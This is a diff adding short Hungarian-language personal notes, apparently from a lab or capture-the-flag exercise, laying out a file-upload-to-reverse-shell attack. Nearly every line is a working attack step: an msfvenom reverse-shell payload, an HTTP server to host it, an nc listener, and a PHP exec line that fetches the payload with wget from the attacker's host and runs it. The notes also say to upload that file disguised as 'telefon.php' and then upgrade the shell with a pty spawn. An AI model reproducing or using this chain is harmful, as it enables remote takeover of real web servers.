@@ -1,0 +1,29 @@
+0.shell
+	msfvenom -p linux/x64/shell_reverse_tcp LHOST=SAJATIP LPORT=4444 -f elf > revshell
+	revshell a nev ez fontos a 3.ban
+1.ugyanebben a terminalban (errornak latszik):
+	python3 -m http.server 8000
+
+2.nyitok egy masik Shellt
+	nc -lvp 4444
+
+3.php exec manual copypaste:
+<?php
+// outputs the username that owns the running php/httpd process
+// (on a system with the "whoami" executable in the path)
+exec('cd /tmp;rm -f /tmp/revshell;wget http://sajatipnk:portaltalaba8000/revshell;chmod 777 /tmp/revshell;/tmp/revshell', $output, $result_code);
+echo "Returned with status $result_code and output:\n";
+print_r($output);
+?>
+
+sajat ip amivel tamadunk
+
+vscodeba bemasolni + kitolteni, exec egy sorba
+
+-elmenteni pl: telefon.php -kent es feltolteni
+
+
+4. rakatt weben, listener ad valaszt
+
+ugyanabba a listenerbe:
+5. python3 -c 'import pty;pty.spawn("/bin/bash")'
